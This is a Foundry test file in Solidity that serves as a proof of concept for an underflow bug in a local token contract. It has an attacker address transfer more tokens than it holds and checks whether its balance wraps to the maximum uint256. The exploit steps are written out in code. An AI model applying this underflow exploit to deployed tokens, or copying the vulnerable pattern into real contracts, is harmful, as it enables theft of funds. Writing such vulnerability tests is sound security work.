// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/token.sol";

contract TokenTransferTest is Test {
    Token token;
    address owner;
    address attacker = address(0x1);
    address recipient = address(0x2);

    function setUp() public {
        owner = address(this);
        token = new Token(100);
    }

    function test_transferUnderflowVulnerability() public {
        // Fund attacker with 10 tokens
        token.transfer(attacker, 10);
        uint initialAttackerBalance = token.balanceOf(attacker);
        uint initialRecipientBalance = token.balanceOf(recipient);
        uint initialOwnerBalance = token.balanceOf(owner);
        
        // State snapshot BEFORE exploit
        console.log("--- BALANCE BEFORE EXPLOIT ---");
        console.log("Attacker balance: %d", initialAttackerBalance);
        console.log("Recipient balance: %d", initialRecipientBalance);
        console.log("Owner balance: %d", initialOwnerBalance);
        console.log("----------------------------------------");

        // Trigger underflow vulnerability
        console.log("--- EXECUTING EXPLOIT: Attacker transfers 11 tokens ---");
        vm.prank(attacker);
        token.transfer(recipient, 11);

        // State snapshot AFTER exploit
        uint finalAttackerBalance = token.balanceOf(attacker);
        uint finalRecipientBalance = token.balanceOf(recipient);
        uint finalOwnerBalance = token.balanceOf(owner);
        
        console.log("--- BALANCE AFTER EXPLOIT ---");
        console.log("Attacker balance: %d", finalAttackerBalance);
        console.log("Recipient balance: %d", finalRecipientBalance);
        console.log("Owner balance: %d", finalOwnerBalance);
        console.log("----------------------------------------");

        // Vulnerability verification
        if (finalAttackerBalance == type(uint256).max &&
            finalRecipientBalance == 11 &&
            finalOwnerBalance == 90) {
            console.log("Vulnerability Exists: attacker balance underflowed to max uint256");
        } else {
            console.log("Vulnerability not Exist: balances do not match expected exploit pattern");
        }
    }
}